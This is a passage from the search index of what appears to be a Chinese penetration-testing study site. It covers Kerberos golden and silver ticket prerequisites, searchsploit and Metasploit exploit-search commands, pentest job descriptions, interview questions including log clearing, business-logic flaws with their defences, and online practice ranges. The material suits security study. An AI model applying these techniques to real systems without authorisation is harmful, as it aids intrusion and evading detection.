<p>\u5229\u7528\u6240\u9700\u4fe1\u606f\uff1a</p> <pre><code>SID\n\u57df\u540d\u79f0\n\u57df\u7528\u6237 krbtgt \u7684\u8d26\u53f7\u5bc6\u7801\u6216 hash\n</code></pre>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BB%80%E4%B9%88%E6%98%AF%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E4%B8%8E%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/#silver-tickets","title":"Silver Tickets","text":"<p>\u767d\u94f6\u7968\u636e\uff0c\u4f2a\u9020 ST \uff0c</p> <p>\u5229\u7528 SPN \u505a\u670d\u52a1\u63a2\u6d4b</p> <p>\u53c2\u8003\u94fe\u63a5 \u6d45\u6790\u9ec4\u91d1\u7968\u636e\u4e0e\u767d\u94f6\u7968\u636e-Shu1L's blog</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E4%BD%9C%E5%B2%97%E4%BD%8D%E8%A6%81%E6%B1%82/","title":"\u5de5\u4f5c\u5c97\u4f4d\u8981\u6c42","text":"<p>\u6f0f\u6d1e\u6316\u6398\u5de5\u7a0b\u5e08 \u5c97\u4f4d\u804c\u8d23\uff1a 1.\u516c\u53f8\u5404\u4e2a\u4ea7\u54c1.\u5f00\u6e90\u4ee3\u7801\u7684\u6f0f\u6d1e\u6316\u6398\uff1b 2.\u5229\u7528FUZZING\u6d4b\u8bd5\u65b9\u6cd5\u5f00\u53d1\u6a21\u7cca\u6d4b\u8bd5\u5de5\u5177\u6216\u8005\u9759\u6001\u4ee3\u7801\u5206\u6790\u5de5\u5177\u3002</p> <p>\u4efb\u804c\u8d44\u683c\uff1a 1.\u719f\u7ec3\u638c\u63e1\u9006\u5411\u5206\u6790\u6280\u672f\uff0c\u719f\u6089OllyDbg.IDA.WINDBG\u7b49\u8c03\u8bd5\u5de5\u5177\uff1b 2.\u719f\u6089\u5e38\u89c1\u6f0f\u6d1e\u7c7b\u578b\uff0c\u719f\u6089\u6f0f\u6d1e\u6316\u6398\u5e38\u89c1\u6280\u672f\uff0c\u5177\u5907\u5e38\u89c1\u6f0f\u6d1e\u5229\u7528\u7ecf\u9a8c\uff1b 3.\u81f3\u5c11\u638c\u63e1\u4e00\u95e8\u9ad8\u7ea7\u7a0b\u5e8f\u8bed\u8a00\uff0c\u5982c/c++/JAVA/C#\u7b49\uff0cc/c++\u4f18\u5148\uff1b 4.\u719f\u6089FUZZING\u6d4b\u8bd5\u65b9\u6cd5\u53ca\u4e3b\u6d41\u7684\u6f0f\u6d1e\u6316\u6398\u5de5\u5177\uff0c\u5177\u5907\u5f00\u53d1fuzz\u5de5\u5177\u7684\u7ecf\u9a8c\u8005\u4f18\u5148\uff1b 5.\u7cbe\u901a\u6587\u4ef6\u5206\u6790\u6280\u672f\uff1b 6.\u6709\u8fc7\u72ec\u7acb\u6f0f\u6d1e\u6316\u6398\u7ecf\u9a8c\u8005\u4f18\u5148\uff1b 7.\u6709\u5185\u6838\u6216\u8005\u5927\u578b\u8f6f\u4ef6\u7f16\u7a0b\u6216\u8005\u8c03\u8bd5\u7ecf\u9a8c\u4f18\u5148\uff1b 8.\u5728\u56fd\u5185\u5916\u6f0f\u6d1e\u5e73\u53f0\u6216\u8005\u516c\u53f8\u4e0a\u62a5\u8fc7\u5b9e\u9645\u6f0f\u6d1e\u4f18\u5148\u3002</p> <p>\u6240\u9700\u6280\u80fd\uff1a  FUZZING\u3001\u6e17\u900f\u6d4b\u8bd5\u3001\u6f0f\u6d1e\u6316\u6398\u3001C++\u3001JAVA</p> <p>1.\u5173\u6ce8\u56fd\u5185\u5916\u6700\u65b0\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u53ef\u72ec\u7acb\u5b8c\u6210\u6f0f\u6d1e\u590d\u73b0\u5206\u6790\u53ca\u5229\u7528\u811a\u672c\u7f16\u5199\uff1b 2.\u7814\u7a76\u524d\u6cbf\u5b89\u5168\u6280\u672f\u7684\u5e94\u7528\u573a\u666f\uff0c\u5bf9\u5916\u8f93\u51fa\u7814\u7a76\u6210\u679c\uff0c\u5efa\u7acb\u6280\u672f\u5f71\u54cd\u529b\uff1b 3.\u8d1f\u8d23\u5f00\u6e90\u8f6f\u4ef6\u4ee3\u7801\u5ba1\u8ba1\u6280\u672f\u7814\u7a76\u53ca\u95ed\u6e90\u8f6f\u4ef6\u6f0f\u6d1e\u6316\u6398\u6280\u672f\u7814\u7a76\uff1b \u719f\u6089\u91c7\u7528C/C++/PHP/GO/Python\u7b49\u8bed\u8a00\u5f00\u53d1\u7684\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u4ee3\u7801\u7f3a\u9677\u548c\u5b89\u5168\u6f0f\u6d1e\uff0c\u4e86\u89e3\u4e3b\u6d41\u7684\u5f00\u53d1\u6846\u67b6\uff1b</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E4%BD%9C%E5%B2%97%E4%BD%8D%E8%A6%81%E6%B1%82/#_1","title":"\u6e17\u900f\u6d4b\u8bd5\u5de5\u7a0b\u5e08","text":"<p>\u8d1f\u8d23\u5bf9\u8ba1\u7b97\u673a\u7cfb\u7edf\u3001\u7f51\u7edc\u3001\u5e94\u7528\u7a0b\u5e8f\u7b49\u8fdb\u884c\u5b89\u5168\u6d4b\u8bd5\uff0c\u5e2e\u52a9\u5ba2\u6237\u5904\u7f6e\u5b89\u5168\u6f0f\u6d1e\u548c\u5b89\u5168\u4e8b\u4ef6\uff0c\u51cf\u5c11\u5b89\u5168\u98ce\u9669\u7684\u4e13\u4e1a\u4eba\u5458\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E4%BD%9C%E5%B2%97%E4%BD%8D%E8%A6%81%E6%B1%82/#_2","title":"\u5de5\u4f5c\u5185\u5bb9","text":"<p>\u4e00\u822c\u6e17\u900f\u6d4b\u8bd5\u5de5\u7a0b\u5e08\u5de5\u4f5c\u5185\u5bb9\u6709\uff1a</p> <p>\u5728\u5ba2\u6237\u6388\u6743\u4e0b\uff0c\u5bf9\u7cfb\u7edf\u3001\u7f51\u7edc\u3001\u670d\u52a1\u5668\u3001App\u5e94\u7528\u7aef\u7b49\u8fdb\u884c\u6e17\u900f\u6d4b\u8bd5\u3001\u5b89\u5168\u6d4b\u8bd5\u3001\u6f0f\u6d1e\u6316\u6398</p> <p>\u8d1f\u8d23\u5b89\u5168\u4e8b\u4ef6\u5e94\u6025\u54cd\u5e94\u5de5\u4f5c\uff0c\u5305\u62ec\u5e94\u6025\u54cd\u5e94\u6d41\u7a0b\u5efa\u8bbe\u3001\u5e94\u6025\u6f14\u7ec3\u3001\u5e94\u6025\u5904\u7406\u3001\u590d\u76d8\u603b\u7ed3\uff0c\u5bf9\u9ed1\u5ba2\u653b\u51fb\u4e8b\u4ef6\u8fdb\u884c\u8ffd\u8e2a\u6eaf\u6e90</p> <p>\u9488\u5bf9\u6e17\u900f\u6d4b\u8bd5\u53d1\u73b0\u7684\u95ee\u9898\u64b0\u5199\u5b89\u5168\u8bc4\u4f30\u62a5\u544a\uff0c\u63d0\u51fa\u4fee\u6539\u5efa\u8bae\u548c\u7f13\u89e3\u63aa\u65bd\uff0c\u63a8\u52a8\u95ee\u9898\u89e3\u51b3</p> <p>\u7814\u7a76\u4e1a\u754c\u6700\u65b0\u7684\u5185\u5916\u7f51\u6e17\u900f\u6d4b\u8bd5\u6280\u672f\u53ca\u65b9\u6cd5\uff0c\u4e0d\u65ad\u4f18\u5316\u89e3\u51b3\u65b9\u6848</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%96%B9%E6%B3%95%E8%AE%BA/","title":"\u65b9\u6cd5\u8bba","text":"<p>\u4f7f\u7528\u641c\u7d22\u5f15\u64ce</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%96%B9%E6%B3%95%E8%AE%BA/#_1","title":"\u641c\u7d22\u6f0f\u6d1e","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%96%B9%E6%B3%95%E8%AE%BA/#_2","title":"\u6d4f\u89c8\u5668","text":"<p> [version] exploit \u5229\u7528shodan\u641c\u7d22\u6f0f\u6d1e https://exploit.shodan.io"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%96%B9%E6%B3%95%E8%AE%BA/#searchsploit","title":"searchsploit","text":"<pre><code>searchsploit \"linux Kernel\"\nsearchsploit apache mod_ssl\nsearchsploit -m 7618  #\u5c06exploit\u7c98\u8d34\u5230\u5f53\u524d\u7684\u76ee\u5f55\nsearchsploit -p 7618 [ .c ]  #\u663e\u793a\u5b8c\u6574\u8def\u5f84\nsearchsploit -p 7618 [ .c ]  #\u6253\u5f00vi\u68c0\u67e5exploit\nsearchsploit --nmap file.xml  #\u5728nmap xml\u7ed3\u679c\u4e2d\u641c\u7d22\u6f0f\u6d1e\n\n\u53e6\u4e00\u4e2a\u6f0f\u6d1e\u641c\u7d22\u5de5\u5177\nhttps://github.com/rfunix/Pompem\n</code></pre> <p>MSF-Search</p> <pre><code>msf&gt; search platform:windows port:135 target:XP type:exploit\n</code></pre> <p>\u6f0f\u6d1e\u6570\u636e\u5e93 https://vulners.com/</p> <p>PacketStorm https://packetstormsecurity.com/</p> <p>Sploitus https://sploitus.com/</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/","title":"\u6e17\u900f\u6d4b\u8bd5\u9762\u8bd5","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_1","title":"\u81ea\u6211\u4ecb\u7ecd","text":"<p>\u91cd\u70b9\u7a81\u51fa\u81ea\u5df1\u80fd\u529b\uff0c\u7b80\u5355\u8bf4\u4e0b\u6316\u6d1e\u7ecf\u5386\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_2","title":"\u8bf4\u4e00\u4e0b\u4f60\u7684\u6e17\u900f\u6d4b\u8bd5\u601d\u8def","text":"<p>\u4fe1\u606f\u6536\u96c6 \u6f0f\u6d1e\u6316\u6398 \u6f0f\u6d1e\u5229\u7528 \u540e\u6e17\u900f \u6743\u9650\u7ef4\u6301 \u6e05\u9664\u65e5\u5fd7 \u751f\u6210\u62a5\u544a</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_3","title":"\u804c\u4e1a\u89c4\u5212","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_4","title":"\u6e17\u900f\u6d4b\u8bd5\u6d41\u7a0b","text":"<p>1\u3001\u4fe1\u606f\u6536\u96c6 \u83b7\u53d6\u57df\u540d\u7684whois\u4fe1\u606f\uff0c\u83b7\u53d6\u6ce8\u518c\u8005\u90ae\u7bb1\u59d3\u540d\u7535\u8bdd \u67e5\u8be2\u670d\u52a1\u5668\u65c1\u7ad9\u4ee5\u53ca\u5b50\u57df\u540d\u7ad9\u70b9 \u67e5\u770b\u670d\u52a1\u5668\u64cd\u4f5c\u7cfb\u7edf\u7248\u672c\uff0cweb\u4e2d\u95f4\u4ef6\uff0c\u770b\u770b\u662f\u5426\u5b58\u5728\u5df2\u77e5\u6f0f\u6d1e \u67e5\u770bIP\uff0c\u8fdb\u884c\u7aef\u53e3\u626b\u63cf \u626b\u63cf\u7f51\u7ad9\u76ee\u5f55\u7ed3\u6784\uff0c\u5229\u7528\u722c\u866b\u548c\u626b\u63cf\u5de5\u5177 \u641c\u7d22\u5f15\u64ce\u8bed\u6cd5\u8fdb\u4e00\u6b65\u63a2\u6d4b\u7f51\u7ad9\u4fe1\u606f\uff0c\u540e\u53f0\uff0c\u654f\u611f\u6587\u4ef6\uff0c\u6f0f\u6d1e\u5229\u7528\u70b9 \u8d44\u4ea7\u4fe1\u606f\u6536\u96c6\u5de5\u5177\uff0c\u706f\u5854\uff0cOneForAll 2\u3001\u6f0f\u6d1e\u626b\u63cf \u6f0f\u6d1e\u626b\u63cf\u5de5\u5177AWVS,Nessus,Appscan,Xray\u3002\u540c\u65f6\u914d\u5408\u624b\u5de5\u6d4b\u8bd5\uff0c\u5982SQL\u6ce8\u5165\uff0cXSS\u8de8\u7ad9\u811a\u672c\uff0cCSRF\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff0cXXE\u6f0f\u6d1e\uff0cSSRF\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u6587\u4ef6\u4e0a\u4f20\uff0c\u6587\u4ef6\u89e3\u6790\uff0c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\uff0c\u8d8a\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7b49\u3002 3\u3001\u6f0f\u6d1e\u5229\u7528 4\u3001\u6743\u9650\u63d0\u5347 5\u3001\u65e5\u5fd7\u6e05\u7406 6\u3001\u603b\u7ed3\u62a5\u544a\u53ca\u4fee\u590d\u65b9\u6848</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#xx","title":"xx\u5de5\u4f5c\u671f\u95f4\uff0c\u600e\u4e48\u505a\u4fe1\u606f\u6536\u96c6","text":"<p>\u57df\u540d\u76f8\u5173\u4fe1\u606f\u3001\u8d44\u4ea7IP\u76f8\u5173\u4fe1\u606f\u3001github\u6cc4\u6f0f\u4fe1\u606f\u3001\u5229\u7528\u641c\u7d22\u5f15\u64ce\u8bed\u6cd5\u53d1\u73b0\u654f\u611f\u4fe1\u606f\uff0c\u6f0f\u6d1e\u7f3a\u9677\u3001\u5b50\u57df\u540d\u641c\u96c6\u3001\u76ee\u5f55\u626b\u63cf\u3002\u4fe1\u606f\u6536\u96c6\u662f\u8d2f\u7a7f\u6574\u4e2a\u6e17\u900f\u6d4b\u8bd5\u7684\u8fc7\u7a0b\uff0c\u5229\u7528\u83b7\u53d6\u5230\u7684\u4fe1\u606f\u5f97\u5230\u66f4\u591a\u7684\u4fe1\u606f\u3002</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_5","title":"\u6700\u96be\u5fd8\u7684\u6316\u6d1e\u7ecf\u5386","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#web","title":"WEB","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#whois","title":"whois\u4e86\u89e3\u5417\uff0c\u53ef\u4ee5\u4ece\u91cc\u9762\u83b7\u53d6\u54ea\u4e9b\u4fe1\u606f","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#http-only","title":"HTTP Only\u6709\u4e86\u89e3\u5417\uff1f","text":"<p>\u963b\u6b62cookie\u8bfb\u53d6\uff0c\u9632\u6b62xss\u653b\u51fb\u7684\u65b9\u6cd5\u4e4b\u4e00\uff0c\u4f46\u662f\u5e76\u4e0d\u80fd\u5b8c\u5168\u9632\u62a4</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#sql","title":"SQL\u6ce8\u5165","text":"<p>\u539f\u7406\uff1a \u5229\u7528\uff1a \u7406\u89e3\uff1a</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#xss","title":"XSS","text":"<p>\u539f\u7406\uff1a \u5229\u7528\uff1a \u7406\u89e3\uff1a</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#ssrf","title":"SSRF","text":"<p>\u539f\u7406\uff1a \u5229\u7528\uff1a \u7406\u89e3\uff1a</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#csrf","title":"CSRF","text":"<p>\u539f\u7406\uff1a \u5229\u7528\uff1a \u7406\u89e3\uff1a</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#csrfssrf","title":"CSRF\u548cSSRF\u7684\u533a\u522b","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_6","title":"\u6587\u4ef6\u4e0a\u4f20","text":"<p>\u7ed5\u8fc7\u601d\u8def</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#waf","title":"WAF\u7ed5\u8fc7","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#sql_1","title":"sql\u6ce8\u5165\u7ed5\u8fc7","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_7","title":"\u767b\u5f55\u6846\u6d4b\u8bd5","text":"<p>\u6f0f\u6d1e\u70b9\uff1aXSS\u3001\u5f31\u53e3\u4ee4\u3001SQL\u6ce8\u5165\u3001CMS\u6f0f\u6d1e\uff0c\u5bc6\u7801\u627e\u56de\u903b\u8f91\u6f0f\u6d1e\uff0c\u529f\u80fd\u6027\u7684\u903b\u8f91\u6f0f\u6d1e</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#shiro","title":"shiro\u53cd\u5e8f\u5217\u5316\u8bf4\u4e00\u4e0b","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_8","title":"\u4e1a\u52a1\u903b\u8f91\u6f0f\u6d1e","text":"<p>1\u3001\u8d8a\u6743\u6f0f\u6d1e     \u6c34\u5e73\u8d8a\u6743\uff1a\u76f8\u540c\u6743\u9650\u8d26\u53f7\u4e4b\u95f4\u7684\u5229\u7528\u5173\u7cfb\uff0c\u4e00\u822c\u5728\u8ba2\u5355\u5904\u6216\u4e2a\u4eba\u4fe1\u606f\u5904\u51fa\u73b0\uff0c\u901a\u8fc7\u4fee\u6539 HTTP \u53c2\u6570\u53bb\u67e5\u770b\u5176\u4ed6\u8d26\u53f7\u7684\u4fe1\u606f\u3002     \u5782\u76f4\u8d8a\u6743\uff1a\u4e0d\u540c\u6743\u9650\u8d26\u53f7\u4e4b\u95f4\u7684\u5229\u7528\u5173\u7cfb\uff0c\u901a\u8fc7\u7ed5\u8fc7\u9274\u6743\u673a\u5236\u83b7\u53d6\u66f4\u9ad8\u7684\u6743\u9650\u3002</p> <p>2\u3001\u5bc6\u7801\u627e\u56de     \u627e\u56de\u5bc6\u7801\u529f\u80fd\u901a\u5e38\u4f1a\u5c06\u7528\u6237\u51ed\u8bc1\uff08\u901a\u5e38\u4e3a\u9a8c\u8bc1\u7801\u6216\u94fe\u63a5\uff09\u53d1\u9001\u5230\u7528\u6237\u6ce8\u518c\u65f6\u4f7f\u7528\u7684\u624b\u673a\u53f7\u6216\u8005\u90ae\u7bb1\u4e2d\uff0c\u53ea\u8981\u7528\u6237\u4e0d\u6cc4\u6f0f\u81ea\u5df1\u7684\u7528\u6237\u51ed\u636e\u5c31\u4e0d\u4f1a\u88ab\u653b\u51fb\u8005\u5229\u7528\u3002\u5982\u679c\u529f\u80fd\u5b58\u5728\u903b\u8f91\u7f3a\u9677\uff0c\u53ef\u80fd\u5c06\u7528\u6237\u81ea\u8bc1\u8eab\u4efd\u7684\u4fe1\u606f\u548c\u7528\u6237\u51ed\u636e\u4ee5\u5404\u79cd\u5404\u6837\u7684\u65b9\u5f0f\u8fd4\u56de\u5230\u5ba2\u6237\u7aef\u3002</p> <pre><code>\u9632\u5fa1\uff1a\n    1\u3001Token \u9a8c\u8bc1\u4e4b\u7c7b\u7684\u6570\u636e\u4e0d\u80fd\u76f4\u63a5\u8fd4\u56de\u7ed9\u7528\u6237\u6570\u636e\u5305\n    2\u3001\u7528\u6237\u9a8c\u8bc1\u4e00\u5b9a\u8981\u5728\u540e\u7aef\u5b9e\u73b0\n</code></pre> <p>3\u3001\u652f\u4ed8\u903b\u8f91\u6f0f\u6d1e     \u539f\u7406\uff1a\u670d\u52a1\u7aef\u6ca1\u6709\u5bf9\u5ba2\u6237\u77ed\u8bf7\u6c42\u6570\u636e\u4e2d\u7684\u91d1\u989d\u3001\u6570\u91cf\u7b49\u654f\u611f\u4fe1\u606f\u4f5c\u6821\u9a8c\uff0c\u5bf9\u653b\u51fb\u8005\u6765\u8bf4\u662f\u53ef\u63a7\u7684\u3002     \u9632\u5fa1\uff1a         1\u3001\u5728\u8bf7\u6c42\u6570\u636e\u4e2d\u5bf9\u6d89\u53ca\u91d1\u989d\u3001\u6570\u91cf\u7b49\u654f\u611f\u4fe1\u606f\u8fdb\u884c\u52a0\u5bc6\uff0c\u5e76\u5728\u670d\u52a1\u5668\u7aef\u5bf9\u5176\u8fdb\u884c\u6821\u9a8c\u3002         2\u3001\u652f\u4ed8\u4ea4\u6613\u8bf7\u6c42\u6570\u636e\u4e2d\u52a0\u5165Token\uff0c\u9632\u6b62\u91cd\u653e\u653b\u51fb\u3002</p> <p>4\u3001\u9a8c\u8bc1\u7801\u76f8\u5173\u6f0f\u6d1e     \u9a8c\u8bc1\u7801\u66b4\u529b\u7834\u89e3\uff1a\u9a8c\u8bc1\u7801\u5177\u6709\u4e00\u5b9a\u7684\u89c4\u5f8b\u6027\uff0c\u901a\u8fc7\u7a77\u4e3e\u6216\u5176\u4ed6\u65b9\u5f0f\u53ef\u731c\u89e3\u3002     \u9a8c\u8bc1\u7801\u91cd\u590d\u4f7f\u7528\uff1a\u5f53\u670d\u52a1\u5668\u7aef\u63a5\u6536\u8bf7\u6c42\u540e\uff0c\u6ca1\u6709\u5c06\u4e0a\u4e00\u6b21\u4fdd\u5b58\u7684Session\u53ca\u65f6\u6e05\u7a7a\uff0c\u5c06\u4f1a\u5bfc\u81f4\u9a8c\u8bc1\u7801\u53ef\u91cd\u590d\u4f7f\u7528\u3002     \u9a8c\u8bc1\u7801\u7ed5\u8fc7\uff1a\u7cfb\u7edf\u6ca1\u6709\u628a\u9a8c\u8bc1\u7801\u548c\u7528\u6237\u653e\u5728\u4e00\u4e2a\u8bf7\u6c42\u91cc\u9762\u6821\u9a8c\uff0c\u5bfc\u81f4\u7ed5\u8fc7\u4e86\u7b2c\u4e00\u6b21\u9a8c\u8bc1\u7801\u5c31\u53ef\u4ee5\u8fdb\u884c\u5bc6\u7801\u7206\u7834 5\u3001\u91cd\u653e\u653b\u51fb\u6f0f\u6d1e     \u539f\u7406\uff1a\u901a\u8fc7\u4fee\u6539\u6216\u4f2a\u9020\u76f8\u5173\u9a8c\u8bc1\u6570\u636e\uff0c\u901a\u8fc7\u591a\u6b21\u91cd\u653e\uff0c\u53ef\u5b9e\u73b0</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_9","title":"\u5185\u7f51\u6e17\u900f","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_10","title":"\u601d\u8def\u7bc7","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#shell","title":"\u5047\u5982\u4f60\u62ff\u5230\u4e86Shell\uff0c\u5982\u4f55\u53d1\u73b0\u57df\u63a7\u4e3b\u673a","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#shell_1","title":"\u83b7\u53d6shell\u7684\u65b9\u6cd5\u4f60\u77e5\u9053\u7684\u6709\u54ea\u4e9b","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#shell_2","title":"\u62ff\u5230Shell\u540e\u7684\u4e0b\u4e00\u6b65\u600e\u4e48\u505a","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_11","title":"\u540e\u6e17\u900f\u9636\u6bb5","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_12","title":"\u6743\u9650\u7ef4\u6301","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_13","title":"\u63d0\u6743","text":"<p>xx\u63d0\u6743\u539f\u7406</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_14","title":"\u4ee3\u7801\u5ba1\u8ba1","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_15","title":"\u7ed3\u8bed","text":""},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95/#_16","title":"\u4f60\u6709\u4ec0\u4e48\u8981\u95ee\u6211\u7684\u5417\uff1f","text":"<p>\u521a\u521a\u56de\u7b54\u7684\u95ee\u9898\uff0c\u54ea\u91cc\u7b54\u7684\u4e0d\u591f\u597d \u5de5\u4f5c\u5c97\u4f4d\u7684\u5927\u90e8\u5206\u90fd\u5728\u505a\u4ec0\u4e48\uff0c\u4ee5\u53ca\u5de5\u4f5c\u5f62\u52bf</p>"},{"location":"%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E5%9C%BA%E6%95%B4%E5%90%88/","title":"\u9776\u573a\u6574\u5408","text":"<p>0x02 \u5728\u7ebf\u9776\u573a</p> <p>1. BUUCTF\u5728\u7ebf\u8bc4\u6d4b\uff1a</p> <ul> <li>https://buuoj.cn</li> </ul> <p>2. Vulhub\u6f0f\u6d1e\u73af\u5883\u96c6\u5408\uff1a</p> <ul> <li>https://vulhub.org</li> </ul> <p>3. \u97e9\u56fdWebhacking\uff1a</p> <ul> <li>https://webhacking.kr</li> </ul> <p>4. \u91cd\u751f\u4fe1\u606f\u5b89\u5168\u5728\u7ebf\u9776\u573a\uff1a</p> <ul> <li>https://bc.csxa.cn</li> </ul> <p>5. \u7f51\u7edc\u4fe1\u606f\u5b89\u5168\u653b\u9632\u5b66\u4e60\u5e73\u53f0\uff1a</p> <ul> <li>http://hackinglab.cn</li> </ul> <p>6. \u58a8\u8005\u5b66\u9662\u5728\u7ebf\u9776\u573a\uff1a</p> <ul> <li>https://www.mozhe.cn/bug</li> </ul> <p>7. \u5c01\u795e\u53f0\u5728\u7ebf\u6f14\u7ec3\u9776\u573a\uff1a</p> <ul> <li>https://hack.zkaq.cn/battle</li> </ul> <p>8. \u5b89\u9e3e\u6e17\u900f\u5b9e\u6218\u5e73\u53f0\uff1a</p> <ul> <li>http://www.whalwl.cn/home</li> </ul> <p>9. XSS Challenges\uff1a</p> <ul> <li>http://xss-quiz.int21h.jp</li> </ul> <p>10. 